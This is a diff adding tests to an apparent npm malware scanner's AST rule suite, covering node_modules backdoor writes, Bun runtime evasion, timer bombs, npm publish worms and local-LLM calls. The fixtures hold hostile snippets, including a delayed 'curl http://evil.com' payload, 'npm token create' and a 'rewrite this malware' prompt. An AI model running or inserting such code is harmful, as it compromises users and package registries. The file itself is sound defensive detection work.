@@ -2139,6 +2139,242 @@ https.request({ hostname: 'api.example.com', path: '/data' }, () => {}).end(toke
       assert(!t, 'Should NOT detect detached_credential_exfil without detached process');
     } finally { cleanupTemp(tmp); }
   });
+  // ===== v2.8.9 Shai-Hulud 2.0 + PhantomRaven rules =====
+  console.log('\n=== NODE_MODULES_WRITE TESTS ===\n');
+
+  await asyncTest('AST: writeFileSync to node_modules/ → node_modules_write CRITICAL', async () => {
+    const tmp = makeTempPkg(`
+const fs = require('fs');
+fs.writeFileSync('node_modules/ethers/providers/provider-jsonrpc.js', 'module.exports = {backdoor: true}');
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'node_modules_write');
+      assert(t, 'Should detect node_modules_write');
+      assert(t.severity === 'CRITICAL', `Expected CRITICAL, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: writeFileSync to src/ → NO node_modules_write', async () => {
+    const tmp = makeTempPkg(`
+const fs = require('fs');
+fs.writeFileSync('./src/utils.js', 'module.exports = {}');
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'node_modules_write');
+      assert(!t, 'writeFileSync to src/ should NOT trigger node_modules_write');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: node_modules_write via variable indirection', async () => {
+    const tmp = makeTempPkg(`
+const fs = require('fs');
+const targetPath = 'node_modules/pkg/index.js';
+fs.writeFileSync(targetPath, 'malicious code');
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'node_modules_write');
+      assert(t, 'Should detect node_modules_write via variable indirection');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: appendFileSync to node_modules/ → node_modules_write', async () => {
+    const tmp = makeTempPkg(`
+const fs = require('fs');
+fs.appendFileSync('node_modules/lodash/index.js', '\\nrequire("./backdoor")');
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'node_modules_write');
+      assert(t, 'Should detect node_modules_write with appendFileSync');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // ===== Bun runtime evasion (AST) =====
+  console.log('\n=== BUN RUNTIME EVASION (AST) TESTS ===\n');
+
+  await asyncTest('AST: execSync("bun run payload.js") → bun_runtime_evasion', async () => {
+    const tmp = makeTempPkg(`
+const { execSync } = require('child_process');
+execSync('bun run payload.js');
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'bun_runtime_evasion');
+      assert(t, 'Should detect bun_runtime_evasion from execSync');
+      assert(t.severity === 'HIGH', `Expected HIGH, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: spawn("bun", ["run", "evil.js"]) → bun_runtime_evasion', async () => {
+    const tmp = makeTempPkg(`
+const { spawn } = require('child_process');
+spawn('bun', ['run', 'evil.js']);
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'bun_runtime_evasion');
+      assert(t, 'Should detect bun_runtime_evasion from spawn');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: require("bun-module") → NO bun_runtime_evasion', async () => {
+    const tmp = makeTempPkg(`
+const bun = require('bun-module');
+bun.doSomething();
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'bun_runtime_evasion');
+      assert(!t, 'require("bun-module") should NOT trigger bun_runtime_evasion');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // ===== Static timer bomb (AST-050) =====
+  console.log('\n=== STATIC TIMER BOMB TESTS ===\n');
+
+  await asyncTest('AST: setTimeout(fn, 172800000) (48h) → static_timer_bomb HIGH', async () => {
+    const tmp = makeTempPkg(`
+function payload() { require('child_process').execSync('curl http://evil.com'); }
+setTimeout(payload, 172800000);
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'static_timer_bomb');
+      assert(t, 'Should detect static_timer_bomb for 48h delay');
+      assert(t.severity === 'HIGH', `Expected HIGH for >24h, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: setTimeout(fn, 7200000) (2h) → static_timer_bomb MEDIUM', async () => {
+    const tmp = makeTempPkg(`
+function activate() { console.log('delayed'); }
+setTimeout(activate, 7200000);
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'static_timer_bomb');
+      assert(t, 'Should detect static_timer_bomb for 2h delay');
+      assert(t.severity === 'MEDIUM', `Expected MEDIUM for 1-24h, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: setTimeout(fn, 1000) (1s) → NO static_timer_bomb', async () => {
+    const tmp = makeTempPkg(`
+setTimeout(() => console.log('quick'), 1000);
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'static_timer_bomb');
+      assert(!t, '1s delay should NOT trigger static_timer_bomb');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: setTimeout(fn, variable) → NO static_timer_bomb', async () => {
+    const tmp = makeTempPkg(`
+const delay = getDelay();
+setTimeout(() => run(), delay);
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'static_timer_bomb');
+      assert(!t, 'Non-literal delay should NOT trigger static_timer_bomb');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // ===== npm publish worm (AST-051) =====
+  console.log('\n=== NPM PUBLISH WORM TESTS ===\n');
+
+  await asyncTest('AST: execSync("npm publish") → npm_publish_worm CRITICAL', async () => {
+    const tmp = makeTempPkg(`
+const { execSync } = require('child_process');
+execSync('npm publish');
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'npm_publish_worm');
+      assert(t, 'Should detect npm_publish_worm');
+      assert(t.severity === 'CRITICAL', `Expected CRITICAL, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: exec("npm publish --access public") → npm_publish_worm', async () => {
+    const tmp = makeTempPkg(`
+const { exec } = require('child_process');
+exec('npm publish --access public');
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'npm_publish_worm');
+      assert(t, 'Should detect npm_publish_worm with --access public');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: execSync("npm token create") → npm_publish_worm', async () => {
+    const tmp = makeTempPkg(`
+const { execSync } = require('child_process');
+const token = execSync('npm token create').toString();
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'npm_publish_worm');
+      assert(t, 'Should detect npm_publish_worm for npm token create');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: execSync("npm install lodash") → NO npm_publish_worm', async () => {
+    const tmp = makeTempPkg(`
+const { execSync } = require('child_process');
+execSync('npm install lodash');
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'npm_publish_worm');
+      assert(!t, 'npm install should NOT trigger npm_publish_worm');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // ===== Ollama local LLM (AST-052) =====
+  console.log('\n=== OLLAMA LOCAL LLM TESTS ===\n');
+
+  await asyncTest('AST: fetch localhost:11434 → ollama_local_llm HIGH', async () => {
+    const tmp = makeTempPkg(`
+fetch('http://localhost:11434/api/generate', {
+  method: 'POST',
+  body: JSON.stringify({ model: 'deepseek-coder', prompt: 'rewrite this malware' })
+});
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'ollama_local_llm');
+      assert(t, 'Should detect ollama_local_llm');
+      assert(t.severity === 'HIGH', `Expected HIGH, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: 127.0.0.1:11434 string literal → ollama_local_llm', async () => {
+    const tmp = makeTempPkg(`
+const OLLAMA_URL = 'http://127.0.0.1:11434/api/chat';
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'ollama_local_llm');
+      assert(t, 'Should detect ollama_local_llm for 127.0.0.1:11434');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: localhost:3000 → NO ollama_local_llm', async () => {
+    const tmp = makeTempPkg(`
+fetch('http://localhost:3000/api/data');
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'ollama_local_llm');
+      assert(!t, 'Non-Ollama port should NOT trigger ollama_local_llm');
+    } finally { cleanupTemp(tmp); }
+  });
 }
 
 module.exports = { runAstTests };
